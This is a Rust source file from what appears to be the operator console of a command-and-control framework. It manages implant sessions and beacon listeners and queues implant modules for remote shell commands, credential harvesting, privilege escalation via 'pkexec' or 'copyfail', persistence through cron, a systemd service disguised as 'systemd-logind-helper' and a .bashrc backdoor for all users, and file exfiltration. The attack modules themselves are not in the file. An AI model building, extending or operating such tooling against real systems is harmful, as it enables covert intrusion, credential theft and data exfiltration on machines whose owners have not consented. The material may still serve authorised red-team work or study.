/// Application state for the operator TUI console.
use crate::api::C2Client;
use serde::{Deserialize, Serialize};
use std::time::Instant;

#[derive(Debug, Clone, PartialEq)]
pub enum InputMode {
    Normal,
    Editing,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionInfo {
    pub implant_id: String,
    pub hostname: String,
    pub ip: String,
    pub first_seen: String,
    pub last_seen: String,
    pub os: String,
    pub arch: String,
    pub uid: u32,
    pub privileges: String,
    pub tier: String,
    pub status: String,
    pub pending_commands: usize,
    pub total_commands: u64,
    pub beacon_count: u64,
    pub protocol_version: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionListResponse {
    pub sessions: Vec<SessionInfo>,
    pub count: usize,
}

#[derive(Debug, Clone)]
pub struct EventLogEntry {
    pub timestamp: chrono::DateTime<chrono::Utc>,
    pub message: String,
    pub level: LogLevel,
}

#[derive(Debug, Clone, PartialEq)]
pub enum LogLevel {
    Info,
    Success,
    Warn,
    Error,
}

pub struct App {
    pub api: C2Client,
    pub sessions: Vec<SessionInfo>,
    pub session_list_idx: usize,
    pub selected_session: Option<String>,
    pub input_mode: InputMode,
    pub input_buffer: String,
    pub interact_history: Vec<String>,
    pub scroll_offset: usize,
    pub event_log: Vec<EventLogEntry>,
    pub refresh_timer: Instant,
    pub running: bool,
    pub status_message: String,
}

impl App {
    pub fn new(api: C2Client) -> Self {
        App {
            api,
            sessions: Vec::new(),
            session_list_idx: 0,
            selected_session: None,
            input_mode: InputMode::Normal,
            input_buffer: String::new(),
            interact_history: Vec::new(),
            scroll_offset: 0,
            event_log: Vec::new(),
            refresh_timer: Instant::now(),
            running: true,
            status_message: String::from("Connected. Press 'i' to enter command mode, 'q' to quit."),
        }
    }

    pub async fn refresh_sessions(&mut self) {
        self.refresh_timer = Instant::now();
        match self.api.list_sessions().await {
            Ok(resp) => {
                self.sessions = resp.sessions;
                self.status_message = format!("{} sessions loaded", self.sessions.len());
            }
            Err(e) => {
                self.status_message = format!("Error: {}", e);
                self.add_event(LogLevel::Error, &format!("Failed to refresh: {}", e));
            }
        }
    }

    pub async fn execute_command(&mut self, input: &str) {
        let parts: Vec<&str> = input.trim().splitn(2, ' ').collect();
        let cmd = parts[0];
        let arg = parts.get(1).unwrap_or(&"");

        match cmd {
            "help" | "?" => {
                self.add_interact("Available commands:");
                self.add_interact("  sessions, list              - Refresh session list");
                self.add_interact("  use <id|hostname>            - Select a session");
                self.add_interact("  back                         - Deselect session");
                self.add_interact("  info                         - Show session details");
                self.add_interact("  ── Implant Modules ──");
                self.add_interact("  shell <command>              - Execute arbitrary command");
                self.add_interact("  recon [passive|active|arp]   - Network reconnaissance");
                self.add_interact("  creds [in_memory|shell]      - Credential harvesting");
                self.add_interact("  privesc [copyfail|pkexec]    - Privilege escalation");
                self.add_interact("  persist cron                 - @reboot cron job");
                self.add_interact("  persist systemd [name]       - systemd service (default: systemd-logind-helper)");
                self.add_interact("  persist bashrc               - .bashrc backdoor for all users");
                self.add_interact("  exfil <path>                 - Exfiltrate file");
                self.add_interact("  download <path>              - Download file from implant");
                self.add_interact("  marker [location]            - Write forensic marker to /dev/shm");
                self.add_interact("  ── Listeners ──");
                self.add_interact("  listeners                    - List active beacon listeners");
                self.add_interact("  listeners add <port> [http|https]");
                self.add_interact("  listeners stop <port>        - Stop a beacon listener");
                self.add_interact("  ── System ──");
                self.add_interact("  system info                  - Process name, PID, config");
                self.add_interact("  system sleep <secs>          - Change beacon interval");
                self.add_interact("  system exit                  - Terminate implant");
                self.add_interact("  quit, q                      - Exit console");
            }

            "sessions" | "list" => {
                self.refresh_sessions().await;
                self.add_interact(&format!("Refreshed: {} sessions", self.sessions.len()));
            }

            "listeners" => {
                let subparts: Vec<&str> = arg.splitn(2, ' ').collect();
                match subparts[0] {
                    "" | "list" => {
                        self.add_interact("[listeners] active beacon listeners:");
                        match self.api.get_listeners().await {
                            Ok(listeners) => {
                                if listeners.is_empty() {
                                    self.add_interact("  (none)");
                                }
                                for l in &listeners {
                                    self.add_interact(&format!("  :{} ({}) — active", l.port, l.protocol));
                                }
                            }
                            Err(e) => self.add_interact(&format!("  Error: {}", e)),
                        }
                    }
                    "add" => {
                        let add_parts: Vec<&str> = subparts.get(1).unwrap_or(&"").splitn(2, ' ').collect();
                        let port_str = add_parts[0];
                        let proto = add_parts.get(1).unwrap_or(&"http");
                        if port_str.is_empty() {
                            self.add_interact("Usage: listeners add <port> [http|https]");
                        } else if let Ok(port) = port_str.parse::<u16>() {
                            self.add_interact(&format!("[listeners] starting {} listener on :{}...", proto, port));
                            match self.api.start_listener(port, proto).await {
                                Ok(info) => self.add_interact(&format!("  Started: :{} ({})", info.port, info.protocol)),
                                Err(e) => self.add_interact(&format!("  Error: {}", e)),
                            }
                        } else {
                            self.add_interact(&format!("Invalid port: {}", port_str));
                        }
                    }
                    "stop" | "remove" => {
                        let port_str = subparts.get(1).unwrap_or(&"");
                        if port_str.is_empty() {
                            self.add_interact("Usage: listeners stop <port>");
                        } else if let Ok(port) = port_str.parse::<u16>() {
                            self.add_interact(&format!("[listeners] stopping listener on :{}...", port));
                            match self.api.stop_listener(port).await {
                                Ok(_) => self.add_interact(&format!("  Stopped listener on :{}", port)),
                                Err(e) => self.add_interact(&format!("  Error: {}", e)),
                            }
                        } else {
                            self.add_interact(&format!("Invalid port: {}", port_str));
                        }
                    }
                    _ => self.add_interact("Usage: listeners [add <port> [proto]|stop <port>]"),
                }
            }

            "use" => {
                if arg.is_empty() {
                    self.add_interact("Usage: use <session-id-or-hostname>");
                } else {
                    // Find session by partial match on id or hostname
                    let found = self.sessions.iter().find(|s| {
                        s.implant_id.contains(arg) || s.hostname.contains(arg)
                    });
                    // Clone the found session data to avoid borrow conflicts
                    let found_data = found.map(|s| (
                        s.implant_id.clone(),
                        s.hostname.clone(),
                        s.ip.clone(),
                        s.os.clone(),
                        s.tier.clone(),
                        s.uid,
                        s.status.clone(),
                    ));
                    match found_data {
                        Some((id, hostname, ip, os, tier, uid, status)) => {
                            self.selected_session = Some(id.clone());
                            self.interact_history.clear();
                            self.add_interact(&format!("Selected session: {} ({})", hostname, id));
                            self.add_interact(&format!(
                                "  IP: {} | OS: {} | Tier: {} | UID: {} | Status: {}",
                                ip, os, tier, uid, status
                            ));
                            // Fetch command history
                            match self.api.get_commands(&id).await {
                                Ok(cmds) => {
                                    if !cmds.is_empty() {
                                        self.add_interact(&format!("  {} previous commands in history", cmds.len()));
                                    }
                                }
                                Err(_) => {}
                            }
                        }
                        None => {
                            self.add_interact(&format!("Session not found: {}", arg));
                        }
                    }
                }
            }

            "back" => {
                if self.selected_session.is_some() {
                    self.add_interact("Deselected session.");
                    self.selected_session = None;
                    self.interact_history.clear();
                }
            }

            "info" => {
                if let Some(ref id) = self.selected_session {
                    match self.api.get_session(id).await {
                        Ok(detail) => {
                            let s = &detail.session;
                            self.add_interact(&format!("=== {} ===", s.hostname));
                            self.add_interact(&format!("  ID:         {}", s.implant_id));
                            self.add_interact(&format!("  IP:         {}", s.ip));
                            self.add_interact(&format!("  OS:         {}", s.os));
                            self.add_interact(&format!("  Arch:       {}", s.arch));
                            self.add_interact(&format!("  UID:        {} ({})", s.uid, s.privileges));
                            self.add_interact(&format!("  Tier:       {}", s.tier));
                            self.add_interact(&format!("  Status:     {}", s.status));
                            self.add_interact(&format!("  First seen: {}", s.first_seen));
                            self.add_interact(&format!("  Last seen:  {}", s.last_seen));
                            self.add_interact(&format!("  Beacons:    {}", s.beacon_count));
                            self.add_interact(&format!("  Commands:   {} ({} pending)", s.total_commands, s.pending_commands));
                            if !detail.command_history.is_empty() {
                                self.add_interact("--- Command History ---");
                                for cmd in &detail.command_history {
                                    let status = match cmd.status.as_str() {
                                        "completed" => "✓",
                                        "failed" => "✗",
                                        "sent" => "→",
                                        _ => "…",
                                    };
                                    self.add_interact(&format!(
                                        "  {} {}:{} - {}", status, cmd.module, cmd.action, cmd.id
                                    ));
                                }
                            }
                        }
                        Err(e) => self.add_interact(&format!("Error: {}", e)),
                    }
                } else {
                    self.add_interact("No session selected. Use 'use <id>' first.");
                }
            }

            cmd if self.selected_session.is_some() => {
                let session_id = self.selected_session.as_ref().unwrap().clone();
                match cmd {
                    "shell" => {
                        if arg.is_empty() {
                            self.add_interact("Usage: shell <command>");
                        } else {
                            self.add_interact(&format!("[shell] {}", arg));
                            self.queue_and_wait(&session_id, "shell", "exec", serde_json::json!({"cmd": arg})).await;
                        }
                    }
                    "recon" => {
                        let action = if arg.is_empty() { "gather" } else { arg };
                        self.add_interact(&format!("[recon] action={}", action));
                        self.queue_and_wait(&session_id, "recon", action, serde_json::json!({"mode": action})).await;
                    }
                    "creds" | "harvest" => {
                        let mode = if arg.is_empty() { "in_memory" } else { arg };
                        self.add_interact(&format!("[creds] mode={}", mode));
                        self.queue_and_wait(&session_id, "creds", "harvest", serde_json::json!({"mode": mode})).await;
                    }
                    "privesc" => {
                        let method = if arg.is_empty() { "copyfail" } else { arg };
                        self.add_interact(&format!("[privesc] {}", method));
                        self.queue_and_wait(&session_id, "privesc", method, serde_json::json!({})).await;
                    }
                    "persist" => {
                        let subparts: Vec<&str> = arg.splitn(2, ' ').collect();
                        let action = subparts[0];
                        let extra = subparts.get(1).unwrap_or(&"");
                        match action {
                            "cron" => {
                                self.add_interact("[persist] cron @reboot");
                                self.queue_and_wait(&session_id, "persist", "cron", serde_json::json!({})).await;
                            }
                            "systemd" => {
                                let name = if extra.is_empty() { "systemd-logind-helper" } else { extra };
                                self.add_interact(&format!("[persist] systemd service={}", name));
                                self.queue_and_wait(&session_id, "persist", "systemd", serde_json::json!({"service_name": name})).await;
                            }
                            "bashrc" => {
                                self.add_interact("[persist] bashrc backdoor");
                                self.queue_and_wait(&session_id, "persist", "bashrc", serde_json::json!({})).await;
                            }
                            _ => self.add_interact("Usage: persist cron|systemd [name]|bashrc"),
                        }
                    }
                    "exfil" => {
                        if arg.is_empty() {
                            self.add_interact("Usage: exfil <path>");
                        } else {
                            self.add_interact(&format!("[exfil] {}", arg));
                            self.queue_and_wait(&session_id, "exfil", "file", serde_json::json!({"path": arg})).await;
                        }
                    }
                    "download" => {
                        if arg.is_empty() {
                            self.add_interact("Usage: download <remote-path>");
                        } else {
                            self.add_interact(&format!("[download] {}", arg));
                            self.queue_and_wait(&session_id, "file", "read", serde_json::json!({"path": arg})).await;
                        }
                    }
                    "marker" => {
                        let location = if arg.is_empty() { "operator" } else { arg };
                        self.add_interact(&format!("[marker] location={}", location));
                        self.queue_and_wait(&session_id, "marker", "write", serde_json::json!({"location": location})).await;
                    }
                    "system" => {
                        let subparts: Vec<&str> = arg.splitn(2, ' ').collect();
                        match subparts[0] {
                            "info" => {
                                self.add_interact("[system] info");
                                self.queue_and_wait(&session_id, "system", "info", serde_json::json!({})).await;
                            }
                            "sleep" => {
                                let secs = subparts.get(1).and_then(|s| s.parse::<u64>().ok()).unwrap_or(5);
                                self.add_interact(&format!("[system] sleep {}s", secs));
                                self.queue_and_wait(&session_id, "system", "sleep", serde_json::json!({"secs": secs})).await;
                            }
                            "exit" => {
                                self.add_interact("[system] exit — terminating implant");
                                self.queue_and_wait(&session_id, "system", "exit", serde_json::json!({})).await;
                            }
                            _ => self.add_interact("Usage: system info|sleep <secs>|exit"),
                        }
                    }
                    _ => self.add_interact(&format!("Unknown command: {}. Type 'help' for available commands.", cmd)),
                }
            }

            _ => {
                self.add_interact(&format!("Unknown command: {}. Type 'help' for available commands.", cmd));
            }
        }
    }

    async fn queue_and_wait(&mut self, session_id: &str, module: &str, action: &str, args: serde_json::Value) {
        match self.api.queue_command(session_id, module, action, &args).await {
            Ok(resp) => {
                self.add_interact(&format!("  Command queued: {} (status: {})", resp.command_id, resp.status));
                self.add_event(LogLevel::Info, &format!("Queued {}:{} on {}", module, action, session_id));

                // Wait briefly and check for results
                tokio::time::sleep(std::time::Duration::from_secs(2)).await;

                match self.api.get_commands(session_id).await {
                    Ok(cmds) => {
                        if let Some(cmd) = cmds.iter().find(|c| c.id == resp.command_id) {
                            if let Some(ref result) = cmd.result {
                                self.display_result(result);
                            } else {
                                self.add_interact("  (waiting for implant to execute...)");
                            }
                        }
                    }
                    Err(_) => {}
                }
            }
            Err(e) => {
                self.add_interact(&format!("  Error queueing command: {}", e));
            }
        }
    }

    fn display_result(&mut self, result: &serde_json::Value) {
        if let Some(data) = result.get("data") {
            if let Some(stdout) = data.get("stdout") {
                if let Some(s) = stdout.as_str() {
                    for line in s.lines() {
                        self.add_interact(&format!("  {}", line));
                    }
                }
            }
            if let Some(stderr) = data.get("stderr") {
                if let Some(s) = stderr.as_str() {
                    if !s.is_empty() {
                        self.add_interact(&format!("  [stderr] {}", s));
                    }
                }
            }
            if let Some(exit_code) = data.get("exit_code") {
                self.add_interact(&format!("  [exit: {}]", exit_code));
            }
            // For other module results, print summary
            if data.get("hostname").is_some() {
                // Recon result
                self.add_interact(&format!("  {}", serde_json::to_string_pretty(data).unwrap_or_default()));
            } else if data.get("ssh_keys_count").is_some() {
                // Creds result
                self.add_interact(&format!("  {}", serde_json::to_string_pretty(data).unwrap_or_default()));
            } else if data.get("path").is_some() && data.get("size").is_some() {
                // File result
                self.add_interact(&format!("  path: {}, size: {}", data["path"], data["size"]));
                if let Some(hex) = data.get("content_hex").and_then(|v| v.as_str()) {
                    self.add_interact(&format!("  content (hex, {} bytes): {}...", hex.len() / 2, &hex[..hex.len().min(200)]));
                }
            }
        }
        if let Some(error) = result.get("data").and_then(|d| d.get("error")) {
            self.add_interact(&format!("  [ERROR] {}", error));
        }
    }

    pub fn add_interact(&mut self, msg: &str) {
        self.interact_history.push(msg.to_string());
        // Keep last 1000 lines
        while self.interact_history.len() > 1000 {
            self.interact_history.remove(0);
        }
    }

    pub fn add_event(&mut self, level: LogLevel, msg: &str) {
        self.event_log.push(EventLogEntry {
            timestamp: chrono::Utc::now(),
            message: msg.to_string(),
            level,
        });
        while self.event_log.len() > 100 {
            self.event_log.remove(0);
        }
    }
}
